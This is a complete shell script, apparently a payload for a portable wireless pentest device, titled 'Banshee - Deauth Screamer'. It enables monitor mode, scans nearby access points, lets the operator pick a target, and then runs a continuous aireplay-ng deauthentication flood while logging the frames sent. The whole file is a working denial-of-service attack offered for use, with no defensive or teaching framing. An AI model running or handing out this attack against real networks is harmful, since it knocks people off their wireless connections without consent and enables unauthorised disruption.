#!/bin/sh
# Title: Banshee - Deauth Screamer
# Author: NullSec
# Description: Aggressive deauthentication attack using aireplay-ng
# Category: WiFi Attack

LOOT_DIR="/mmc/nullsec/banshee"
mkdir -p "$LOOT_DIR"

echo "👻 BANSHEE - DEAUTH SCREAMER"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

echo "[*] Enabling monitor mode..."
airmon-ng start wlan0 >/dev/null 2>&1
MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
[ -z "$MON_IF" ] && MON_IF="wlan0mon"

echo "[*] Scanning for targets (15s)..."
timeout 15 airodump-ng "$MON_IF" -w /tmp/banshee --output-format csv 2>/dev/null &
sleep 15

if [ -f /tmp/banshee-01.csv ]; then
    echo ""
    echo "Available targets:"
    grep -E "^[0-9A-F]{2}:" /tmp/banshee-01.csv 2>/dev/null | \
        awk -F',' '{print NR") BSSID:"$1" CH:"$4" ESSID:"$14}' | head -15
    echo ""
    echo -n "Select target number: "
    read TARGET_NUM
    
    TARGET_LINE=$(grep -E "^[0-9A-F]{2}:" /tmp/banshee-01.csv | sed -n "${TARGET_NUM}p")
    TARGET_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    TARGET_CH=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
else
    echo -n "Enter target BSSID: "
    read TARGET_BSSID
    echo -n "Enter channel: "
    read TARGET_CH
fi

echo -n "Duration in seconds [120]: "
read DURATION
DURATION=${DURATION:-120}

echo ""
echo "[*] Setting channel $TARGET_CH..."
iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null

echo "[*] Unleashing Banshee on $TARGET_BSSID..."
LOG_FILE="$LOOT_DIR/banshee_$(date +%Y%m%d_%H%M).log"

# Continuous deauth attack
timeout $DURATION aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IF" 2>&1 | tee "$LOG_FILE" &
ATTACK_PID=$!

echo "[+] Attack running (PID: $ATTACK_PID)"
echo "[*] Duration: ${DURATION}s"
echo "[*] Press Ctrl+C to stop early"
wait $ATTACK_PID

# Cleanup
airmon-ng stop "$MON_IF" >/dev/null 2>&1
rm -f /tmp/banshee* 2>/dev/null

DEAUTH_COUNT=$(grep -c "Sending DeAuth" "$LOG_FILE" 2>/dev/null || echo "0")
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "👻 BANSHEE COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Deauths sent: ~$DEAUTH_COUNT"
echo "Log: $LOG_FILE"
